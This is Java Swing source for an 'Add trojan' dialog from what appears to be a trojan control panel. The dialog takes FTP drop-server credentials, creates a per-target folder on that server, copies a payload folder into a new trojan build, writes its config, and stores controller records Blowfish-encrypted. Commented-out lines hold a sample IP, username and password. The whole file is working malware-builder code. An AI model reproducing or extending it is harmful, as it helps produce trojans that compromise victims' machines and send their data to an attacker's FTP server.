package com.QQPanel;import java.awt.AWTEvent;import java.awt.BorderLayout;import java.awt.Dimension;import java.awt.Rectangle;import java.awt.Toolkit;import java.awt.event.ActionEvent;import java.awt.event.ActionListener;import java.awt.event.MouseEvent;import java.io.BufferedWriter;import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStreamWriter;import java.util.Iterator;import java.util.Map;import java.util.StringTokenizer;import javax.swing.DefaultComboBoxModel;import javax.swing.DefaultListModel;import javax.swing.Icon;import javax.swing.ImageIcon;import javax.swing.JButton;import javax.swing.JComboBox;import javax.swing.JFileChooser;import javax.swing.JFrame;import javax.swing.JLabel;import javax.swing.JList;import javax.swing.JOptionPane;import javax.swing.JPasswordField;import javax.swing.JScrollPane;import javax.swing.JTextField;import sun.net.ftp.FtpClient;import com.config.ParseConfig;import com.enc.Blowfish;import com.topking.ftp.bean.ConfigBean;import com.topking.ftp.bean.UserInfoBean;import com.topking.ftp.util.GetFTP;/** * @author duomeng 添加用户面板 */public class AddUser extends JFrame {	protected String remotePath;	private ICQPOP icqPop;	private UserInfoBean uib = new UserInfoBean();	private ConfigBean cfb = new ConfigBean();	private ParseConfig pc;	private static final long serialVersionUID = 1L;	private JLabel nickName = new JLabel(); // 昵称	public static JTextField textUsernick = new JTextField(10); // 昵称	private JLabel userID = new JLabel(); // 标识名	public static JTextField textUserID = new JTextField(10); // 标识名	private JLabel userIcon = new JLabel(); // 头像	private JComboBox jcb; // 用户头像选择	NewCellRenderer ncr = new NewCellRenderer();	private JLabel ftpURL = new JLabel(); // FTP地址	private JTextField ftpHost = new JTextField(10); // FTP地址	private JLabel ftpName = new JLabel(); // FTP用户名	private JTextField ftpUserName = new JTextField(10); // FTP用户名	private JLabel ftpPasswd = new JLabel(); // FTP密码	private JPasswordField ftpPassWord = new JPasswordField(10); // FTP密码	private JLabel trojanLocalDirectory = new JLabel();// 木马生成本地目录	public static JTextField trojanDirectory = new JTextField();// 木马本地目录	private JLabel trojanLocalPath = new JLabel(); // 木马生成路径	public static JTextField trojanPath = new JTextField(); // 木马生成路径	private JButton browse = new JButton();	private JButton browseButton = new JButton();	private JButton login = new JButton(); // 确认	private JButton quit = new JButton(); // 退出	private Toolkit kit = null;	private JList iconJList2;	private DefaultListModel dlm;	private DefaultComboBoxModel model = null;	FtpClient myFtp;	File f = null;	@SuppressWarnings("static-access")	public AddUser(ICQPOP icqpop) {		this.icqPop = icqpop;		this.iconJList2 = icqPop.iconJList;		this.dlm = icqPop.dlm;		this.setLayout(null);		this.setTitle("添加木马");		this.setSize(new Dimension(450, 470));		nickName.setText("昵    称");		nickName.setBounds(new Rectangle(45, 20, 67, 18));		userID.setText("标 识 名");		userID.setBounds(new Rectangle(45, 70, 67, 18));		userIcon.setText("选择头像");		userIcon.setBounds(new Rectangle(45, 120, 67, 18));		ftpURL.setText("FTP地址");		ftpURL.setBounds(new Rectangle(45, 170, 67, 18));		ftpName.setText("FTP账号");		ftpName.setBounds(new Rectangle(45, 220, 67, 18));		ftpPasswd.setText("FTP密码");		ftpPasswd.setBounds(new Rectangle(45, 270, 67, 18));		trojanLocalDirectory.setText("木马本地目录");		trojanLocalDirectory.setBounds(new Rectangle(30, 320, 87, 18));		trojanDirectory.setBounds(new Rectangle(110, 320, 210, 30));		trojanLocalPath.setText("木马生成路径");		trojanLocalPath.setBounds(new Rectangle(30, 360, 87, 18));		trojanPath.setBounds(new Rectangle(110, 360, 210, 30));		String dfPath = "";		String[] dF = System.getProperty("user.dir").split("\\\\");		for (int i = 0; i < dF.length - 1; i++) {			if (i == dF.length - 2) {				dfPath += dF[i];			} else {				dfPath += (dF[i] + "\\");			}		}		trojanPath.setText(dfPath);// 设置默认生成木马文件夹		trojanDirectory.setText(dfPath);		browse.setText("浏览");		browse.setBounds(new Rectangle(320, 320, 60, 25));		browse.addActionListener(new ActionListener() { // 选择目的目录			public void actionPerformed(ActionEvent e) {				JFileChooser dirChooser = new JFileChooser("/");				dirChooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);				int result = dirChooser.showOpenDialog(dirChooser);				if (result == JFileChooser.APPROVE_OPTION) {					File dir = dirChooser.getSelectedFile();					trojanDirectory.setText(dir.getPath());				} else if (result == JFileChooser.CANCEL_OPTION) {					trojanDirectory.setText(trojanDirectory.getText());				}			}		});		browseButton.setText("浏览");		browseButton.setBounds(new Rectangle(320, 360, 60, 25));		browseButton.addActionListener(new ActionListener() { // 选择目的目录					public void actionPerformed(ActionEvent e) {						JFileChooser dirChooser = new JFileChooser("/");						dirChooser								.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);						int result = dirChooser.showOpenDialog(dirChooser);						if (result == JFileChooser.APPROVE_OPTION) {							File dir = dirChooser.getSelectedFile();							trojanPath.setText(dir.getPath());						} else if (result == JFileChooser.CANCEL_OPTION) {							trojanPath.setText(trojanPath.getText());						}					}				});		textUsernick.setBounds(new Rectangle(110, 20, 270, 30));		textUserID.setBounds(new Rectangle(110, 70, 270, 30));		ftpHost.setBounds(new Rectangle(110, 170, 270, 30));		// ftpHost.setText("192.168.149.200");		ftpUserName.setBounds(new Rectangle(110, 220, 270, 30));		// ftpUserName.setText("test");		;		ftpPassWord.setBounds(new Rectangle(110, 270, 270, 30));		// ftpPassWord.setText("lab605607");		login.setText("确  认");		login.setBounds(new Rectangle(100, 405, 81, 29));		login.addMouseListener(new java.awt.event.MouseAdapter() {			public void mouseClicked(MouseEvent e) {				login_mouseClicked(e);			}		});		quit.setText("取  消");		quit.setBounds(new Rectangle(250, 405, 81, 29));		quit.addMouseListener(new java.awt.event.MouseAdapter() {			public void mouseClicked(MouseEvent e) {				quit_mouseClicked(e);			}		});		enableEvents(AWTEvent.WINDOW_EVENT_MASK);		try {			java.awt.Image img;			System.out.println("JComboBoxTest");			img = getToolkit().getDefaultToolkit().getImage(					this.getClass().getClassLoader()							.getResource("com/QQPanel/image/zoomp_24.gif"));			super.setIconImage(img);		} catch (Exception e) {			e.printStackTrace();		}		jcb = new JComboBox();		model = new DefaultComboBoxModel();		IconListItem ili = null;		String[] s = { "1.jpg ", "2.jpg ", "3.jpg ", "4.jpg ", "5.jpg ",				"6.jpg ", "7.jpg ", "8.jpg ", "9.jpg " };		// 列表显示所有头像图标		for (int j = 0; j < s.length; j++) {			Icon icon = new ImageIcon(this.getClass().getClassLoader()					.getResource("com/QQPanel/image/" + (j + 1) + ".jpg"));// 图片的路径																			// 自己找个图片试一下就看到了"			ili = new IconListItem(icon, "", "");// 列表中的每个元素			model.addElement(ili);			jcb.setModel(model);			jcb.setRenderer(ncr);			jcb.setBounds(110, 105, 115, 55);			add(nickName, null);			add(userID, null);			add(userIcon, null);			add(ftpURL, null);			add(ftpName, null);			add(ftpPasswd, null);			add(jcb, null);			add(trojanDirectory);			add(browse);			add(trojanLocalDirectory);			add(trojanPath);			add(browseButton);			add(trojanLocalPath);			add(textUsernick);			add(textUserID);			add(ftpHost);			add(ftpUserName);			add(ftpPassWord);			add(login);			add(quit);			// 设置在显示器上的默认显示位置			kit = Toolkit.getDefaultToolkit();			setLocation(kit.getScreenSize().width / 25 * 14,					kit.getScreenSize().height / 25 * 7);			setResizable(false);			setVisible(true);		}	}	void login_mouseClicked(MouseEvent e) {		// 生成木马单元 ——生成木马->新建文件夹【userpanel+congfig】		new ProgressBar(null, null, "正在生成木马,请稍候……", "木马生成成功", "木马生成失败");		myFtp = new GetFTP(ftpHost.getText(), ftpUserName.getText(),				new String(ftpPassWord.getPassword())).getFtp();		if ((myFtp != null) && (myFtp.serverIsOpen())) {			String iconName = getIcon(ncr);			// 新添加的用户信息			String[] obj = new String[7];			obj[0] = textUsernick.getText();			obj[1] = textUserID.getText();			obj[2] = ftpHost.getText();			obj[3] = ftpUserName.getText();			obj[4] = new String(ftpPassWord.getPassword());			obj[5] = "new ImageIcon("					+ this.getClass().getClassLoader()							.getResource("com/QQPanel/image/" + iconName) + ")";			obj[6] = trojanDirectory.getText();			StringBuilder sb = new StringBuilder();			for (String str : obj) {				sb.append(str + ",");			}			String userInfo = sb.toString();			System.out.println("userInfo:" + userInfo);			int k = icqPop.infomap.size();			// 判断用户名是否重复或为空			boolean temp = true;			for (int j = 0; j < k; j++) {				String Filename[] = icqPop.infomap.get(j).split(",");				if (textUserID.getText().equals(Filename[1])						|| textUserID.getText().isEmpty()) {					JOptionPane.showMessageDialog(null, "标识名重复或为空", "错误",							JOptionPane.ERROR_MESSAGE);					temp = false;					break;				}				// 此处在增加对标识名的限制，只能是数字和英文字母下划线的组合			}			if (trojanDirectory.getText().equals("")) {				JOptionPane.showMessageDialog(null, "木马本地目录为空", "错误",						JOptionPane.ERROR_MESSAGE);				temp = false;			}			System.out.println("size=" + k);			if (temp) {				icqPop.infomap.put(k, userInfo);				dlm.addElement(obj);				iconJList2 = new JList(dlm);				iconJList2.setCellRenderer(new CellRenderer());				JScrollPane jsp = new JScrollPane(iconJList2);				icqPop.jPanel.setLayout(new BorderLayout());				icqPop.jPanel.add(jsp);				// 初始化ftp目录，建立木马对应文件夹				createDir(textUserID.getText());				uib = setUserInfo(obj);				icqPop.timemap.put(uib.getUserID(), "0-0-0-0,0");				icqPop.nummap.put(uib.getUserID(), 0);				String ftpupdir = textUserID.getText();				String shortPath = null;				File dirFile = new File(trojanPath.getText() + "\\" + ftpupdir);				dirFile.mkdir();				copyFolder(System.getProperty("user.dir") + "/Full",						trojanPath.getText() + "\\" + ftpupdir + "/");				System.err.print("System.getProperty(user.dir)"						+ System.getProperty("user.dir"));				if (trojanPath.getText().equals(System.getProperty("user.dir"))) {					shortPath = trojanPath.getText() + "\\" + ftpupdir							+ "\\bin\\config";				} else {					shortPath = trojanPath.getText() + "\\" + ftpupdir							+ "\\bin\\config";				}				System.out.println("PWD: " + shortPath);				// 新建并启动生成配置文件线程				pc = new ParseConfig(shortPath, uib, cfb);				Thread config = new Thread(pc);				config.start();				new ProgressBar(null, config, "正在生成木马,请稍候……", "木马生成成功",						"木马生成失败");				try {					config.join();// 等待线程结束				} catch (InterruptedException e1) {					e1.printStackTrace();				}				StoreUserInfo();			}		} else {			JOptionPane.showMessageDialog(null, "FTP不可达", "错误",					JOptionPane.ERROR_MESSAGE);		}		this.dispose();	}	void quit_mouseClicked(MouseEvent e) {		this.dispose();	}	private void StoreUserInfo() {		try {			String userinfo;			String userInfoStr = "";			Iterator<Map.Entry<Integer, String>> userit = icqPop.infomap					.entrySet().iterator();			while (userit.hasNext()) {				Map.Entry<Integer, String> entry = userit.next();				userinfo = entry.getValue() + "\r\n";				userInfoStr = userInfoStr + userinfo;			}			Blowfish crypt = new Blowfish("USERINFO.config");			System.out.println("开始加密");			String stren = userInfoStr.toString();			stren = crypt.encryptString(stren);			BufferedWriter out;			// 写userInfo2到USERINFO.config文件中			out = new BufferedWriter(new OutputStreamWriter(					new FileOutputStream("USERINFO.config")));			try {				out.write(stren);				out.flush();				out.close();			} catch (IOException e) {				// TODO Auto-generated catch block				e.printStackTrace();			}		} catch (FileNotFoundException e1) {			// TODO Auto-generated catch block			e1.printStackTrace();		}	}	// 获得头像名	private String getIcon(NewCellRenderer ncr) {		String iconUrl = ncr.getIcon().toString();		String iconName = iconUrl.substring(iconUrl.lastIndexOf("/") + 1);		System.out.println(iconName);		return iconName;	}	public void copyFile(String oldPath, String newPath, String projectName) { // 文件拷贝		try {			int bytesum = 0;			int byteread = 0;			File oldfile = new File(oldPath);			File dirFile = new File(newPath + projectName);			dirFile.createNewFile();			if (oldfile.exists()) { // 文件存在时				InputStream inStream = new FileInputStream(oldPath); // 读入原文件				FileOutputStream fs = new FileOutputStream(newPath						+ projectName);				byte[] buffer = new byte[1444];				while ((byteread = inStream.read(buffer)) != -1) {					bytesum += byteread; // 字节数 文件大小					System.out.println(bytesum);					fs.write(buffer, 0, byteread);				}				fs.flush();				fs.close();				inStream.close();			}		} catch (Exception e) {			System.out.println("复制单个文件操作出错");			e.printStackTrace();		}	}	private void copyFolder(String oldPath, String newPath) { // 文件夹拷贝		try {			(new File(newPath)).mkdirs(); // 如果文件夹不存在 则建立新文件夹			File a = new File(oldPath);			String[] file = a.list();			File temp = null;			for (int i = 0; i < file.length; i++) {				if (oldPath.endsWith(File.separator)) {					temp = new File(oldPath + file[i]);				} else {					temp = new File(oldPath + File.separator + file[i]);				}				if (temp.isFile()) {					FileInputStream input = new FileInputStream(temp);					FileOutputStream output = new FileOutputStream(newPath							+ "/" + (temp.getName()).toString());					byte[] b = new byte[1024 * 5];					int len;					while ((len = input.read(b)) != -1) {						output.write(b, 0, len);					}					output.flush();					output.close();					input.close();				}				if (temp.isDirectory()) {// 如果是子文件夹					copyFolder(oldPath + "/" + file[i], newPath + "/" + file[i]);				}			}		} catch (Exception e) {			System.err.println("复制整个文件夹内容操作出错");			e.printStackTrace();		}	}	public boolean createDir(String dir) {		try {			myFtp.ascii();			StringTokenizer s = new StringTokenizer(dir, File.separator); // sign			s.countTokens();			String pathName = myFtp.pwd();			while (s.hasMoreElements()) {				// pathName = pathName + File.separator + (String)				// s.nextElement();				pathName = pathName + (String) s.nextElement();// 服务器新建用户前的反斜杠				try {					myFtp.sendServer("MKD " + pathName + "\r\n");				} catch (Exception e) {					e.printStackTrace();					return false;				}				myFtp.readServerResponse();			}			myFtp.binary();			return true;		} catch (IOException e1) {			e1.printStackTrace();			return false;		}	}	private UserInfoBean setUserInfo(String[] uInfo) {		UserInfoBean uib = new UserInfoBean();		String userNickName = textUsernick.getText();		uib.setUserName(userNickName);		String uid = textUserID.getText();		uib.setUserID(uid);		String userFtpUrl = ftpHost.getText();		uib.setFtpUrl(userFtpUrl);		String userFtpName = ftpUserName.getText();		uib.setFtpName(userFtpName);		String userFtpPasswd = new String(ftpPassWord.getPassword());		uib.setFtpPasswd(userFtpPasswd);		String userLocalPath = trojanDirectory.getText();		uib.setLocalPath(userLocalPath);		String uIcon = uInfo[5];		uib.setUserIcon(uIcon);		return uib;	}}